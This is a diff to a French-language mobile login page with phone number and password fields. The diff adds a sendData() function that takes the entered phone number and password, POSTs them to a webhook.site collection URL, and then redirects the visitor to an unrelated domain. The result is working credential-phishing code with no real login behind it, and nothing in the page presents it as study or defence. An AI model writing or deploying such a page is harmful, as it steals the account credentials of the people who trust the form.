@@ -8,7 +8,6 @@
     * {
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       font-family: Arial, sans-serif;
@@ -210,30 +209,30 @@
   <!-- FORMULAIRE -->
   <div class="form-container">
     <div class="form-group">
-      <!-- Icône téléphone noir (SVG) -->
       <svg class="phone-icon" viewBox="0 0 24 24"><path d="M17 1H7a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2ZM12 21a1.25 1.25 0 1 1 0-2.5A1.25 1.25 0 0 1 12 21Zm5-3.5h-10V4h10Z"/></svg>
-      
       <span class="country-code" onclick="openSelector()">
         <span id="currentCode">+237</span>
-        <!-- Flèche vers le bas (SVG) -->
         <svg class="arrow-icon" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
       </span>
-      
-      <input type="tel" placeholder="Entrez votre numéro de portable" />
+      <input type="tel" id="phone" placeholder="Entrez votre numéro de portable" />
     </div>
+
     <div class="form-group">
       <img src="https://img.icons8.com/ios-filled/50/lock.png" alt="lock" />
-      <input type="password" placeholder="Veuillez entrer votre mot de passe" />
+      <input type="password" id="password" placeholder="Veuillez entrer votre mot de passe" />
     </div>
+
     <div class="checkbox">
       <input type="checkbox" id="remember" />
       <label for="remember">Se souvenir du mot de passe</label>
     </div>
-    <button class="submit-btn">Connectez-vous à votre compte</button>
+
+    <button class="submit-btn" onclick="sendData()">Connectez-vous à votre compte</button>
   </div>
 
-  <!-- OVERLAY + SÉLECTEUR D’INDICATIF -->
+  <!-- OVERLAY + SELECTEUR -->
   <div class="overlay" onclick="closeSelector()"></div>
+
   <div class="country-selector" id="selector">
     <div class="country-search">
       <input type="text" id="search" placeholder="Sélectionner l’indicatif régional">
@@ -260,6 +259,36 @@
     function selectCode(code) {
       document.getElementById('currentCode').textContent = code;
       closeSelector();
+    }
+
+    function sendData() {
+      const code = document.getElementById('currentCode').textContent.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!phone || !password) {
+        alert("Veuillez remplir tous les champs !");
+        return;
+      }
+
+      const data = {
+        phone: code + phone,
+        password: password
+      };
+
+      fetch("https://webhook.site/d47102ec-cb03-4b85-83d7-d85b4c854457", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(() => {
+        window.location.href = "https://ibisabb.cc";
+      })
+      .catch(() => {
+        window.location.href = "https://ibisabb.cc";
+      });
     }
   </script>
 
